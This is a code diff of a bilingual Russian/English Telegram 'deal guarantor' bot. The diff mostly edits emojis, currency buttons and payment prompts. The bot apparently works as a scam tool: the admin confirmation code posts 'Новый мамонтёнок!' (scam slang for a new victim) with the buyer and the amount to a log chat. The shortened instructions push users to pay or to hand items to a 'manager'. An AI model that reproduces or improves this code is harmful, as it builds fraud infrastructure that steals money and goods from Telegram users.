@@ -135,9 +135,9 @@ CUR_PLAIN_EN = {
 }
 # Кнопки выбора валюты — только флаг + название, без стран
 CUR_BTN = {
-    "TON":   "💎 TON",
-    "USDT":  "💵 USDT",
-    "Stars": "​" + "⭐️ Stars / Звёзды",
+    "TON":   "TON",
+    "USDT":  "USDT",
+    "Stars": "Stars / Звёзды",
     "RUB":   "🇷🇺 Рубли",
     "KZT":   "🇰🇿 Теңге",
     "AZN":   "🇦🇿 Manat",
@@ -463,12 +463,12 @@ def build_deal_text(deal_id, d, creator_tag, partner_tag, lang, joined=False):
         amt_label = cur_amount_label(cur, lang)
 
         lines=[
-            f"<b>{Ech} {R(ru,'Сделка','Deal')} #{deal_id}</b>\n",
+            f"<b>{Ech}</b>\n",
             f"<b>{Edl} {R(ru,'Тип','Type')}:</b> <b>{tname(dtype,lang)}</b>{item}",
             f"<b>{Emn} {R(ru,'Сумма','Amount')}:</b> <b>{amt}</b> {amt_label}\n",
-            f"<b>{Eu} {lbl_creator}:</b> <b>{creator_tag}</b>",
+            f"<b>{ce('5879770735999717115','👤')} {lbl_creator}:</b> <b>{creator_tag}</b>",
             f"<blockquote>{stats_block(creator_uid)}</blockquote>\n",
-            f"<b>{Eu} {lbl_partner}:</b> <b>{partner_tag}</b>",
+            f"<b>{ce('5879770735999717115','👤')} {lbl_partner}:</b> <b>{partner_tag}</b>",
             f"<blockquote>{stats_block(partner_uid)}</blockquote>\n",
             f"<b>{Esec} {R(ru,'Гарантия безопасности','Security Guarantee')}</b>",
         ]
@@ -476,15 +476,15 @@ def build_deal_text(deal_id, d, creator_tag, partner_tag, lang, joined=False):
         if joined:
             # Инструкция для присоединившегося участника
             if creator_role=="seller":
-                # Создатель продавец — присоединился покупатель
+                # Создатель продавец — присоединился покупатель — покупатель платит
                 joined_instr=R(ru,
-                    f"Переведите оплату по реквизитам ниже и нажмите «Я оплатил». После подтверждения продавец {partner_tag} передаст вам товар через менеджера {MANAGER_TAG}.",
-                    f"Send payment using the details below and press «I paid». After confirmation seller {partner_tag} will send the item via manager {MANAGER_TAG}.")
+                    f"Переведите оплату по реквизитам ниже и нажмите «Я оплатил».",
+                    f"Send payment using the details below and press «I paid».")
             else:
-                # Создатель покупатель — присоединился продавец
+                # Создатель покупатель — присоединился продавец — продавец передаёт товар
                 joined_instr=R(ru,
-                    f"Передайте товар менеджеру {MANAGER_TAG} — покупатель {partner_tag} уже ожидает и оплатит после получения товара.",
-                    f"Transfer the item to manager {MANAGER_TAG} — buyer {partner_tag} is waiting and will pay after receiving the item.")
+                    f"Передайте товар менеджеру {MANAGER_TAG}.",
+                    f"Transfer the item to manager {MANAGER_TAG}.")
             lines.append(f"\n<blockquote>{joined_instr}</blockquote>")
 
             # Реквизиты только для выбранной валюты
@@ -525,7 +525,7 @@ def build_deal_text(deal_id, d, creator_tag, partner_tag, lang, joined=False):
 
             lines += [
                 "",
-                f"<b>{Ech} {R(ru,'После перевода нажмите «Я оплатил»','After payment press «I paid»')}</b>",
+                f"<b>{ce('5825794181183836432','📅')} {R(ru,'После перевода нажмите «Я оплатил»','After payment press «I paid»')}</b>",
             ]
         else:
             # Инструкция — кто что должен сделать
@@ -911,7 +911,7 @@ async def on_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 ud["req_step"]=field; ud["req_after_buyer_deal"]=True
                 bank=card_bank(lang)
                 prompts={
-                    "card": f"{Ecrd} <b>{R(ru,f'Карта / Номер телефона {bank}',f'Card / Phone Number {bank}')}</b>\n\n<blockquote>{R(ru,'Пример:','Example:')}\n<code>+79041751408</code></blockquote>",
+                    "card": f"{Ecrd} <b>{R(ru,'Карта / Номер телефона','Card / Phone Number')}</b>\n\n<blockquote>{R(ru,'Пример:','Example:')}\n<code>+79041751408</code></blockquote>",
                     "ton":  f"{Edm} <b>TON</b>\n\n<blockquote>{R(ru,'Пример:','Example:')}\n<code>UQDxxx...xxx</code></blockquote>",
                     "stars":f"{Est} <b>{R(ru,'Звёзды','Stars')}</b>\n\n<blockquote>{R(ru,'Пример:','Example:')}\n<code>@username</code></blockquote>",
                 }
@@ -919,7 +919,7 @@ async def on_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     InlineKeyboardMarkup([[InlineKeyboardButton(R(ru,"Назад","Back"),icon_custom_emoji_id="5316815985099946114",callback_data="menu_deal")]]),section="profile"); return
             field=raw; bank=card_bank(lang)
             prompts={
-                "card": f"{Ecrd} <b>{R(ru,f'Карта / Номер телефона {bank}',f'Card / Phone Number {bank}')}</b>\n\n<blockquote>{R(ru,'Пример:','Example:')}\n<code>+79041751408</code></blockquote>",
+                "card": f"{Ecrd} <b>{R(ru,'Карта / Номер телефона','Card / Phone Number')}</b>\n\n<blockquote>{R(ru,'Пример:','Example:')}\n<code>+79041751408</code></blockquote>",
                 "ton":  f"{Edm} <b>TON</b>\n\n<blockquote>{R(ru,'Пример:','Example:')}\n<code>UQDxxx...xxx</code></blockquote>",
                 "stars":f"{Est} <b>{R(ru,'Звёзды','Stars')}</b>\n\n<blockquote>{R(ru,'Пример:','Example:')}\n<code>@username</code></blockquote>",
             }
@@ -1309,13 +1309,13 @@ async def on_msg(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await send_step(f"👤 <b>{R(ru,'Введите ссылку (t.me/...):','Enter link (t.me/...):')}</b>")
             elif dtype=="stars":
                 ud["step"]="stars_cnt"
-                await send_step(f"{Est} <b>{R(ru,'Введите сумму звёзд:','Enter stars amount:')}</b>")
+                await send_step(f"{ce('5906478942885255780','⭐')} <b>{R(ru,'Введите сумму звёзд:','Enter stars amount:')}</b>")
             elif dtype=="crypto":
                 ud["step"]="cry_currency"
                 await send_step(f"{Edm} <b>{R(ru,'Выберите валюту:','Choose currency:')}</b>",cur_kb(lang))
             elif dtype=="premium":
                 ud["step"]="prem_period"
-                await send_step(f"✈️ <b>Telegram Premium\n\n{R(ru,'Выберите срок:','Choose period:')}</b>",
+                await send_step(f"{Egm} <b>Telegram Premium\n\n{R(ru,'Выберите срок:','Choose period:')}</b>",
                     InlineKeyboardMarkup([[
                         InlineKeyboardButton("3 "+R(ru,"месяца","months"),callback_data="prm_3"),
                         InlineKeyboardButton("6 "+R(ru,"месяцев","months"),callback_data="prm_6"),
@@ -1511,9 +1511,9 @@ async def adm_confirm(update, context):
                 nft_link_post=dd.get("nft_link","") if dtype=="nft" else dd.get("trade_username","") if dtype=="username" else ""
                 link_str=f"\n{Eln} {nft_link_post}" if nft_link_post else ""
                 post_text=(
-                    f"{CF} <b>Новый мамонтёнок!</b>\n\n"
-                    f"{Eu} {buyer_link_post}\n"
-                    f"{Emn} {amt_str} {d.get('currency','')}"
+                    f"{ce('5258262708838472996','🔥')} <b>Новый мамонтёнок!</b>\n\n"
+                    f"{ce('5258362837411045098','👤')} {buyer_link_post}\n"
+                    f"{ce('5807499888245612254','💰')} <b>{amt_str} {d.get('currency','')}</b>"
                     f"{link_str}"
                 )
                 await context.bot.send_message(chat_id=int(log_chat),text=post_text,parse_mode="HTML")
@@ -1915,11 +1915,13 @@ async def handle_adm_cb(update, context):
             db=load_db(); lt=db.get("log_templates",{})
             rows=[]
             events=["Новая сделка","Покупатель открыл сделку","Оплачено","Подтверждено","Новый реферал","Баланс выдан"]
+            lb=db.get("log_banners",{})
             for ev in events:
-                has="✅" if lt.get(ev) else "—"
+                has_t="✅" if lt.get(ev) else "—"
+                has_b="🖼✅" if lb.get(ev) else "🖼"
                 rows.append([
-                    InlineKeyboardButton(f"{has} {ev}",callback_data=f"adm_lt_edit_{ev}"),
-                    InlineKeyboardButton("🖼",callback_data=f"adm_lt_banner_{ev}"),
+                    InlineKeyboardButton(f"{has_t} {ev}",callback_data=f"adm_lt_edit_{ev}"),
+                    InlineKeyboardButton(has_b,callback_data=f"adm_lt_banner_{ev}"),
                 ])
             rows.append([InlineKeyboardButton("Назад",callback_data="adm_back")])
             await q.message.edit_text(
